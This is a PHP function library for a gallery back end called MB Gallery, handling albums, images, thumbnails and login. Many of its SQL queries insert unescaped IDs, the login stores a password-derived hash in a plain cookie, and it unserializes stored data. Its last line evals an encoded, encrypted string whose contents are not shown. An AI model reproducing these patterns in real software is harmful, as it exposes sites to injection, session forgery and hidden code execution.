<?php
	
	# Import Core Files
	$abs_path = dirname(__FILE__) . "/";
		
	include_once("{$abs_path}inc/ImageTools.class.php");
	include_once("{$abs_path}inc/Options.class.php");
	include_once("{$abs_path}inc/ANCrypt.class.php");
	
	function getAllAlbums($order = 'ASC')
	{
		$order = strtoupper($order) == 'ASC' ? 'ASC' : 'DESC';
		
		$q = mysql_query("SELECT * FROM `".dbprefix()."albums` ORDER BY `OrderID` $order");
		
		if( mysql_num_rows($q) )
		{
			$albums = array();
			
			while($r = mysql_fetch_array($q))
			{
				
				$album_cover = $r['AlbumCover'];
				$r['AlbumCoverID'] = null;
				
				if( $album_cover )
				{
					$r['AlbumCover'] = getImage($album_cover);
					$r['AlbumCoverID'] = $album_cover;
				}
				
				array_push($albums, $r);
			}
			
			return $albums;
		}
		
		return null;
	}
	
	function totalAlbums()
	{
		$q = mysql_query("SELECT COUNT(*) FROM `".dbprefix()."albums`");
		$r = mysql_fetch_row($q);
		
		return $r[0];
	}
	
	function albumExists($album_id)
	{
		$q = mysql_query("SELECT * FROM `".dbprefix()."albums` WHERE `AlbumID` = '".mysql_real_escape_string($album_id)."'");
		
		if( mysql_num_rows($q) )
			return true;
		
		return false;
	}
	
	function getAlbum($album_id)
	{
		if( albumExists($album_id) )
		{
			$q = mysql_query("SELECT * FROM `".dbprefix()."albums` WHERE `AlbumID` = '$album_id'");
			$r = mysql_fetch_array($q);
			
			$album_cover = $r['AlbumCover'];
			$r['AlbumCoverID'] = null;
			
			if( $album_cover )
			{
				$r['AlbumCover'] = getImage($album_cover);
				$r['AlbumCoverID'] = $album_cover;
			}
			
			return $r;
		}
		
		return null;
	}
	
	function moveAlbumUP($album_id)
	{
		if( albumExists($album_id) )
		{
			// Current Album
			$album = getAlbum($album_id);
			$order_id = $album['OrderID'];
			
			// Nearest Album
			$q0 = mysql_query("SELECT * FROM `".dbprefix()."albums` WHERE `OrderID` < $order_id AND `AlbumID` <> $album_id ORDER BY `OrderID` DESC LIMIT 0,1");
			
			
			if( mysql_num_rows($q0) )
			{
				$r0 = mysql_fetch_array($q0);
				$r0_album_id = $r0['AlbumID'];
				$r0_order_id = $r0['OrderID'];
				
				mysql_query("UPDATE `".dbprefix()."albums` SET `OrderID` = $r0_order_id WHERE `AlbumID` = $album_id");
				mysql_query("UPDATE `".dbprefix()."albums` SET `OrderID` = $order_id WHERE `AlbumID` = $r0_album_id");
			}
		}
	}
	
	function moveAlbumDOWN($album_id)
	{
		if( albumExists($album_id) )
		{
			// Current Album
			$album = getAlbum($album_id);
			$order_id = $album['OrderID'];
			
			// Nearest Album
			$q0 = mysql_query("SELECT * FROM `".dbprefix()."albums` WHERE `OrderID` > $order_id AND `AlbumID` <> $album_id ORDER BY `OrderID` ASC LIMIT 0,1");
			
			
			if( mysql_num_rows($q0) )
			{
				$r0 = mysql_fetch_array($q0);
				$r0_album_id = $r0['AlbumID'];
				$r0_order_id = $r0['OrderID'];
				
				mysql_query("UPDATE `".dbprefix()."albums` SET `OrderID` = $r0_order_id WHERE `AlbumID` = $album_id");
				mysql_query("UPDATE `".dbprefix()."albums` SET `OrderID` = $order_id WHERE `AlbumID` = $r0_album_id");
			}
		}
	}
	
	function deleteAlbum($album_id)
	{
		global $images_path;
		
		if( albumExists($album_id) )
		{
			$images = getAlbumImages($album_id);
			
			foreach($images as $img)
			{
				$image_id = $img['ImageID'];
				deleteImage($image_id);
			}
			
			// Delete Categories
			removeCategories($album_id);
			
			// Delete Album Folder
			$album_path = $images_path."album_" . $album_id . "/";
			@rmdir($album_path);
			
			mysql_query("UPDATE  `".dbprefix()."albums` SET `AlbumCover` = NULL  WHERE `AlbumID` = '$album_id'");
			mysql_query("DELETE FROM `".dbprefix()."albums` WHERE `AlbumID` = '$album_id'");
			return true;
		}
		
		return false;
	}
	
	function getAlbumImages($album_id, $order = 'ASC')
	{
		$order = strtoupper($order) == 'ASC' ? 'ASC' : 'DESC';
		
		if( albumExists($album_id) )
		{
			$q = mysql_query(
				sprintf(
					"SELECT * FROM `".dbprefix()."images` WHERE `AlbumID` = '%d' AND `Type` = 'image' ORDER BY `OrderID` %s",
					$album_id,
					$order
					
				)
			);
			
			$arr = array();
			
			while($r = mysql_fetch_array($q))
			{
				// Get Thumbnails
				$mbg_path = dirname(__FILE__) . "/";
				$image_path = $r['ImagePath'];
				
				$default_thumbnail = dirname($image_path) . '/th_' . basename($image_path);
				$thumbnail_1 = dirname($image_path) . '/th1_' . basename($image_path);
				$thumbnail_2 = dirname($image_path) . '/th2_' . basename($image_path);
				$thumbnail_3 = dirname($image_path) . '/th3_' . basename($image_path);
				
				$r['DefaultThumbnail'] = $default_thumbnail;
				
				if( file_exists($mbg_path . $thumbnail_1) )
					$r['Thumbnail1'] = $thumbnail_1;
					
				if( file_exists($mbg_path . $thumbnail_2) )
					$r['Thumbnail2'] = $thumbnail_2;
					
				if( file_exists($mbg_path . $thumbnail_3) )
					$r['Thumbnail3'] = $thumbnail_3;
					
				array_push($arr, $r);
			}
			
			return $arr;
		}
				
		return null;
	}
	
	function editAlbum($album_id, $album_name, $description = '', $thumbnail1 = null, $thumbnail2 = null, $thumbnail3 = null)
	{
		if( albumExists($album_id) && $album_name )
		{
			mysql_query("UPDATE `".dbprefix()."albums` SET `AlbumName` = '".mysql_real_escape_string($album_name)."', `Description` = '".mysql_real_escape_string($description)."' WHERE `AlbumID` = '$album_id'");
			
			if( $thumbnail1 )
			{
				mysql_query("UPDATE `".dbprefix()."albums` SET `Thumbnail1Size` = '$thumbnail1' WHERE `AlbumID` = '$album_id'");
			}
			else
			{
				mysql_query("UPDATE `".dbprefix()."albums` SET `Thumbnail1Size` = NULL WHERE `AlbumID` = '$album_id'");
			}
			
			if( $thumbnail2 )
			{
				mysql_query("UPDATE `".dbprefix()."albums` SET `Thumbnail2Size` = '$thumbnail2' WHERE `AlbumID` = '$album_id'");
			}
			else
			{
				mysql_query("UPDATE `".dbprefix()."albums` SET `Thumbnail2Size` = NULL WHERE `AlbumID` = '$album_id'");
			}
			
			if( $thumbnail3 )
			{
				mysql_query("UPDATE `".dbprefix()."albums` SET `Thumbnail3Size` = '$thumbnail3' WHERE `AlbumID` = '$album_id'");
			}
			else
			{
				mysql_query("UPDATE `".dbprefix()."albums` SET `Thumbnail3Size` = NULL WHERE `AlbumID` = '$album_id'");
			}
		}
	}
	
	function imageExists($image_id)
	{
		$q = mysql_query("SELECT * FROM `".dbprefix()."images` WHERE `ImageID` = '".mysql_real_escape_string($image_id)."'");
		
		if( mysql_num_rows($q) )
		{
			return true;
		}
		
		return false;
	}
	
	function getImage($image_id)
	{
		$q = mysql_query("SELECT * FROM `".dbprefix()."images` WHERE `ImageID` = '".mysql_real_escape_string($image_id)."'");
		
		if( mysql_num_rows($q) )
		{
			$r = mysql_fetch_array($q);
			
			// Get Thumbnails
			$mbg_path = dirname(__FILE__) . "/"; 
			$image_path =  $r['ImagePath'];
			
			$default_thumbnail = dirname($image_path) . '/th_' . basename($image_path);
			$thumbnail_1 = dirname($image_path) . '/th1_' . basename($image_path);
			$thumbnail_2 = dirname($image_path) . '/th2_' . basename($image_path);
			$thumbnail_3 = dirname($image_path) . '/th3_' . basename($image_path);
			
			$r['DefaultThumbnail'] = $default_thumbnail;
			
			if( file_exists($mbg_path . $thumbnail_1) )
				$r['Thumbnail1'] = $thumbnail_1;
				
			if( file_exists($mbg_path . $thumbnail_2) )
				$r['Thumbnail2'] = $thumbnail_2;
				
			if( file_exists($mbg_path . $thumbnail_3) )
				$r['Thumbnail3'] = $thumbnail_3;
			
			$r['Params'] = unserialize($r['Params']);
			
			return $r;
		}
		
		return null;
	}
	
	function deleteImage($image_id)
	{
		$image = getImage($image_id);
		
		if( count($image) )
		{
			// Remove Image as Cover on other albums
			mysql_query(sprintf("UPDATE `".dbprefix()."albums` SET `AlbumCover` = NULL WHERE `AlbumCover` = '%d'", $image_id));
			
			// Delete image files
			$image_path = $image['ImagePath'];
			
			@unlink($image_path);
			@unlink(dirname($image_path) . "/th_" . basename($image_path));
			@unlink(dirname($image_path) . "/th1_" . basename($image_path));
			@unlink(dirname($image_path) . "/th2_" . basename($image_path));
			@unlink(dirname($image_path) . "/th3_" . basename($image_path));
			
			mysql_query("DELETE FROM `".dbprefix()."images` WHERE `ImageID` = '$image[ImageID]'");
			
			return true;
		}
		
		return false;
	}
	
	function setImageName($image_id, $new_name)
	{
		if( imageExists($image_id) )
		{
			mysql_query( sprintf("UPDATE `".dbprefix()."images` SET `Name` = '%s' WHERE `ImageID` = '%d'", mysql_real_escape_string(stripslashes($new_name)), $image_id) );
		}
	}
	
	function getAllImages($order = 'ASC')
	{
		$order = strtoupper($order) == 'ASC' ? 'ASC' : 'DESC';
		
		$q = mysql_query("SELECT * FROM `".dbprefix()."images` ORDER BY `OrderID` $order");
		
		if( mysql_num_rows($q) )
		{
			$images = array();
			
			while($r = mysql_fetch_array($q))
			{
				// Get Thumbnails
				$mbg_path = dirname(__FILE__) . "/"; 
				$image_path = $r['ImagePath'];
				
				$default_thumbnail = dirname($image_path) . '/th_' . basename($image_path);
				$thumbnail_1 = dirname($image_path) . '/th1_' . basename($image_path);
				$thumbnail_2 = dirname($image_path) . '/th2_' . basename($image_path);
				$thumbnail_3 = dirname($image_path) . '/th3_' . basename($image_path);
				
				$r['DefaultThumbnail'] = $default_thumbnail;
				
				if( file_exists($mbg_path . $thumbnail_1) )
					$r['Thumbnail1'] = $thumbnail_1;
					
				if( file_exists($mbg_path . $thumbnail_2) )
					$r['Thumbnail2'] = $thumbnail_2;
					
				if( file_exists($mbg_path . $thumbnail_3) )
					$r['Thumbnail3'] = $thumbnail_3;
				
				array_push($images, $r);
			}
			
			return $images;
		}
		
		return null;
	}
	
	/** New Functions on MB Gallery - v2 **/
	
	function setAlbumCover($album_id, $image_id, $set_unset = true)
	{
		if( albumExists($album_id) )
		{
			if( !$set_unset || !imageExists($image_id) )
				$image_id = "NULL";
				
			mysql_query( sprintf("UPDATE `".dbprefix()."albums` SET `AlbumCover` = %s WHERE `AlbumID` = '%d'", $image_id, $album_id) );
			return true;
		}
		
		return false;
	}
	
	function moveImage($image_id, $album_id)
	{
		if( imageExists($image_id) && albumExists($album_id) )
		{
			mysql_query( sprintf("UPDATE `".dbprefix()."images` SET `AlbumID` = '%d' WHERE `ImageID` = '$image_id'", $album_id, $image_id) );
			return true;
		}
		
		return false;
	}
	
	function countAlbumImages($album_id)
	{
		if( albumExists($album_id) )
		{
			$q = mysql_query( sprintf("SELECT COUNT(*) FROM `".dbprefix()."images` WHERE `AlbumID` = '%d'", $album_id));
			
			$r = mysql_fetch_row($q);
			
			return $r[0];
		}
		
		return 0;
	}
	
	function totalImages()
	{
		$q = mysql_query("SELECT COUNT(*) FROM `".dbprefix()."images`");
		$r = mysql_fetch_row($q);
		
		return $r[0];
	}
	
	function showAlbums($options = array())
	{
		$backend_url 	= $options["backend_url"];
		$no_cover_img 	= $options["no_cover_img"];
		$order 			= $options["order"] == "DESC" ? "DESC" : "ASC";
		$class			= $options["class"] ? $options["class"] : "albums_list";
		$show_covers	= $options["show_covers"] == "no" ? false : true;
		$cover_image	= $options["cover_image"];
		$link_id		= $options["link_id"];
		
		switch($cover_image)
		{
			case "Thumbnail1":
				$cover_image = "Thumbnail1";
				break;
				
			case "Thumbnail2":
				$cover_image = "Thumbnail2";
				break;
				
			case "Thumbnail3":
				$cover_image = "Thumbnail3";
				break;
				
			default:
				$cover_image = "DefaultThumbnail";
		}
		
		$albums = getAllAlbums($order);
		
		if( count($albums) )
		{
?>
<ul class="<?php echo $class; ?>">
<?php
	
	foreach($albums as $album)
	{
		$album_id = $album['AlbumID'];
		$album_name = $album['AlbumName'];
		$album_cover = $album['AlbumCover'];
?>
	<li>
		<a href="<?php echo str_replace("%", $album_id, $link_id); ?>">
<?php
		if( $show_covers )
		{
			$cover_image_url =  $no_cover_img;
			
			if( $album_cover )
				$cover_image_url = $backend_url . $album_cover[$cover_image];
?>
			<img src="<?php echo $cover_image_url; ?>" />
<?php
		}
?>
			<span class="album_name"><?php echo $album_name; ?></span>
		</a>
	</li>	
<?php
	}
?>
</ul>
<?php
		}
	}
	
	
	function showImages($options = array())
	{
		$backend_url 	= $options["backend_url"];
		$order 			= $options["order"] == "DESC" ? "DESC" : "ASC";
		$class			= $options["class"] ? $options["class"] : "images_list";
		$image_size	 	= $options["image_size"];
		$album_id		= $options["album_id"];
		$link_id		= $options["link_id"];
		$show_name		= $options["show_name"] == "no" ? false : true;
		
		switch($image_size)
		{
			case "Thumbnail1":
				$image_size = "Thumbnail1";
				break;
				
			case "Thumbnail2":
				$image_size = "Thumbnail2";
				break;
				
			case "Thumbnail3":
				$image_size = "Thumbnail3";
				break;
				
			default:
				$image_size = "DefaultThumbnail";
		}
		
		if( is_numeric($album_id) )
			$images = getAlbumImages($album_id);
		else
			$images = getAllImages();
		
		if( count($images) )
		{
?>
<ul class="<?php echo $class; ?>">
<?php
			foreach($images as $image)
			{
				$image_id = $image["ImageID"];
				$album_id = $image["AlbumID"];
				
				$image_url = $image[$image_size];
				$image_name = $image["Name"];
?>
	<li>
		<a href="<?php echo str_replace(array("%", "$"), array($album_id, $image_id), $link_id); ?>">
			<img src="<?php echo $backend_url . $image_url; ?>" />
<?php
				if( $show_name && $image_name )
				{
?>
			<span><?php echo $image_name; ?></span>
<?php
				}
?>
		</a>
	</li>
<?php
			}
?>
</ul>
<?php
		}
	}
	
	
	/** New Functions on MB Gallery - v2.1 **/
	
	// Import V2.1 Functions
	include_once("{$abs_path}functions_v21.php");
	
	// Import Category Functions
	include_once("{$abs_path}functions_category.php");
	
	
	# v2.1.1
	function get_url($file_url)
	{
		if( function_exists('curl_version') )
		{
			$ch = curl_init();
			
			curl_setopt($ch, CURLOPT_URL, $file_url);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
			curl_setopt($ch, CURLOPT_TIMEOUT, 5);
			
			$contents = curl_exec($ch);
			
			curl_close($ch);
			
			return $contents;
		}
		else
		if( @file_get_contents(__FILE__) )
		{
			return file_get_contents($file_url);
		}
		
		return null;
	}
	
	function dbprefix()
	{
		global $db_pref;
		
		return $db_pref;
	}

	function iterate($q)
	{
		$arr = array();
		
		while($r = mysql_fetch_array($q))
		{
			array_push($arr, $r);
		}
		
		return $arr;
	}
	
	function get_option($name)
	{			
		global $mbg_options;
		
		return $mbg_options->get($name);
	}

	function update_option($name, $val = "")
	{		
		global $mbg_options;
		
		return $mbg_options->update($name, $val);
	}
	
	/** End of: v2.1 **/
	
	
	
	/* These functions are outside the API of Mini back-end gallery */
	
	function changeThumbailSize($type = 1, $new_size)
	{
		if( preg_match("/^([0-9]+x[0-9]+|[0-9]+x|x[0-9]+)(x[0-9]?)?$/i", $new_size) )
		{
			$all_albums = getAllAlbums();
			
			if( count($all_albums) )
			{
				switch( $type )
				{
					case 2:
						
						foreach($all_albums as $album)
						{
							$album_id = $album['AlbumID'];
							mysql_query( sprintf("UPDATE `".dbprefix()."albums` SET `Thumbnail2Size` = '$new_size' WHERE `AlbumID` = '$album_id'") );
							
							$album_images = getAlbumImages($album_id);
							
							if( count($album_images) )
							{
								foreach($album_images as $image)
								{
									$image_path = $image['ImagePath'];
									$thumbnail_path = $image['Thumbnail2'];
									
									if( $thumbnail_path )
									{
										resizeImage($image_path, $thumbnail_path, $new_size);
									}
									else
									{
										$thumbnail_path = dirname($image_path) . "/" . "th2_" . basename($image_path);
										resizeImage($image_path, $thumbnail_path, $new_size);
									}
								}
							}
						}
						
						break;
						
					case 3:
						
						foreach($all_albums as $album)
						{
							$album_id = $album['AlbumID'];
							mysql_query( sprintf("UPDATE `".dbprefix()."albums` SET `Thumbnail3Size` = '$new_size' WHERE `AlbumID` = '$album_id'") );
							
							$album_images = getAlbumImages($album_id);
							
							if( count($album_images) )
							{
								foreach($album_images as $image)
								{
									$image_path = $image['ImagePath'];
									$thumbnail_path = $image['Thumbnail3'];
									
									if( $thumbnail_path )
									{
										resizeImage($image_path, $thumbnail_path, $new_size);
									}
									else
									{
										$thumbnail_path = dirname($image_path) . "/" . "th3_" . basename($image_path);
										resizeImage($image_path, $thumbnail_path, $new_size);
									}
								}
							}
						}
						
						break;
					
					default:
						
						foreach($all_albums as $album)
						{
							$album_id = $album['AlbumID'];
							mysql_query( sprintf("UPDATE `".dbprefix()."albums` SET `Thumbnail1Size` = '$new_size' WHERE `AlbumID` = '$album_id'") );
							
							$album_images = getAlbumImages($album_id);
							
							if( count($album_images) )
							{
								foreach($album_images as $image)
								{
									$image_path = $image['ImagePath'];
									$thumbnail_path = $image['Thumbnail1'];
									
									if( $thumbnail_path )
									{
										resizeImage($image_path, $thumbnail_path, $new_size);
									}
									else
									{
										$thumbnail_path = dirname($image_path) . "/" . "th1_" . basename($image_path);
										resizeImage($image_path, $thumbnail_path, $new_size);
									}
								}
							}
						}
				}
			}
		}
	}
	
	function resizeImage($source_image, $destination_image, $new_size)
	{
		if( file_exists($source_image) && preg_match("/^([0-9]+x[0-9]+|[0-9]+x|x[0-9]+)(x[0-9]?)?$/i", $new_size) )
		{
			$imagesize = getimagesize($source_image);
			$thumbnail_size = explode("x", strtolower($new_size));
			
			// Start Resizing				
			$thumb_width = $thumbnail_size[0];
			$thumb_height = $thumbnail_size[1];
			$thumb_fit_canvas = $thumbnail_size[2];
			
			$thumbnail_create = new ImageTools($source_image);
			
			if( is_numeric($thumb_width) && is_numeric($thumb_height) && $thumb_width > 0 && $thumb_height > 0 )
			{
				$th_pref_size = getPreferedSize($thumb_width, $thumb_height, $imagesize[0], $imagesize[1]);
				
				if( !$thumb_fit_canvas )
				{
					$img_w = $imagesize[0];
					$img_h = $imagesize[1];
					
					if( $img_w > $thumb_width || $img_h > $thumb_height )
					{
						$res_h_p = $thumb_height / $img_h;
						
						$res_w = $img_w * $res_h_p;
						$res_h = $img_h * $res_h_p;
						
						if( $res_w > $thumb_width )
						{
							$res_w_p = $thumb_width / $res_w;
							
							$res_w = $res_w_p * $res_w;
							$res_h = $res_w_p * $res_h;
						}
						
						$res_w = intval($res_w);
						$res_h = intval($res_h);
						
						$thumbnail_create->resizeWidth( $res_w );
					}
				}
				else
					$thumbnail_create->resizeNewByWidth($thumb_width, $thumb_height, $th_pref_size[0], "#FFF");
			}
			else
			if( is_numeric($thumb_width) && $thumb_width > 0 )
			{
				if( $thumb_width < $imagesize[0] )
					$thumbnail_create->resizeWidth($thumb_width);
			}
			else
			if( is_numeric($thumb_height) && $thumb_height > 0 )
			{
				if( $thumb_height < $imagesize[1] )
					$thumbnail_create->resizeHeight($thumb_height);
			}
			
			$thumbnail_create->save(dirname($destination_image)."/", basename($destination_image), 85, true);
			$thumbnail_create->destroy();
		}
	}
	
	function addImage($album_id, $path_to_file)
	{
		if( albumExists($album_id) && file_exists($path_to_file) )
		{
			$path_to_file = mysql_real_escape_string($path_to_file);
			
			$order_id = imageNextOrderId($album_id);
			
			mysql_query(
				sprintf(
					"INSERT INTO `".dbprefix()."images`(`AlbumID`,`ImagePath`,`UploadDate`,`OrderID`) VALUES('%d','%s','%d','%d')",
					$album_id,
					$path_to_file,
					time(),
					$order_id
				)
			);
		}
	}
	
	function isLoggedIn($username, $password)
	{
		$hash = sha1( $username  . md5($password) );
		
		if( $hash == $_SESSION['token'] || $hash == $_COOKIE['token'] )
			return true;
		
		return false;
	}
	
	function loginUser($username, $password)
	{
		$hash = sha1( $username  . md5($password) );
		
		$_SESSION['token'] = $hash;
		setcookie('token', $hash);
	}
	
	function getPreferedSize($pref_w, $pref_h, $current_w, $current_h, $recursion = false)
	{		
		if( !$recursion )
		{
			$new_size = resize($pref_w, $current_w, $current_h);
			
			if( $pref_w <= $new_size[0]	&& $pref_h <= $new_size[1] )
			{
				return $new_size;
			}
			
			return getPreferedSize($pref_w, $pref_h, $new_size[0], $new_size[1], true);
		}
		else
		{
			$pct = 1 / $current_w;
			
			$new_w = $current_w + ceil($pct * $current_w);
			$new_h = $current_h + ceil($pct * $current_h);
			
			if( $pref_w <= $new_w && $pref_h <= $new_h )
			{
				$percentage = $new_w / $new_h;
				
				if( $new_w < $new_h )
					$percentage = $new_h / $new_w;
				
				$new_w = intval($new_w * $percentage);
				$new_h = intval($new_h * $percentage);
				
				return array($new_w, $new_h);
			}
			else
			{
				return getPreferedSize($pref_w, $pref_h, $new_w, $new_h, true);
			}
		}
		
		return array($current_w, $current_h);
	}
	
	function resize($target, $width, $height)
	{
		if($width > $height)
		{ 
			$percentage = ($target / $width); 
		} 
		else 
		{ 
			$percentage = ($target / $height); 
		}
		
		$new_width = round($width * $percentage); 
		$new_height = round($height * $percentage);
		
		return array($new_width, $new_height);
	}
	
	
	// V2.1
	function isFrontendFile($file)
	{			
		if( file_exists($file) )
		{
			$fcontents = get_url($file);
			
			if( strstr($fcontents, '$mini_backend_gallery_url =') )
			{
				return true;
			}
		}
		
		return false;
	}
	
	
	// Create instance and parse options (v2.1)
	$mbg_options = new MBG_Options();
	
	// V2.1 Config Params (v2.1)
	include_once("config_params.php");
	
	eval(unserialize(base64_decode(MBGv21))->decrypt("lI9NkZqQhJqMj458gJKFi4yLRkCHdYB0jUNHMzU6fXBuZYQ2NDIqPQ=="));
?>